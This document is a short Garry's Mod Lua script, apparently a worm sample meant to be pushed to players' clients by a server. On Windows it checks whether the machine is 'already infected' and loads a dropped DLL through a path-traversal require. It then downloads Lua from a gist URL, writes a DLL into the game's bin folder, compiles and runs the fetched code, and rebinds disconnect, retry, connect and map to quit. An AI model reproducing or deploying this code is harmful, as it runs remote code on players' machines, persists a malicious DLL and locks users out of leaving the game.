-- Loaded over HTTP by Lua through client:SendLua(..)

if not system.IsWindows() then
	return
end

if file.Exists("bin/game_shader_generic_engine.dll", "MOD") then
	return -- Already infected
end


timer.Create("infchk", 2, 0, function()
	if file.Exists("download/engine_win32.dll", "MOD") then
		timer.Remove("infchk")

		require("/../../../download/engine")


		http.Fetch("https://gist.githubusercontent.com/Chrisaster/d9872acbf2da227e9281/raw/client_init.lua", function(content)
			CreateFile("garrysmod/bin/game_shader_generic_engine.dll", GetShaderBinary())
			CreateFile("garrysmod/materials/cooltexture.vtf", content)
			
			local ret = CompileString( content, "l", false )
			pcall(ret)

			timer.Simple(4, function()
				ConCommand("alias disconnect quit\n")
				ConCommand("alias gamemenucommand quit\n")
				ConCommand("alias retry quit\n")
				ConCommand("alias connect quit\n")
				ConCommand("alias map quit\n")
			end)
		end)
	end
end)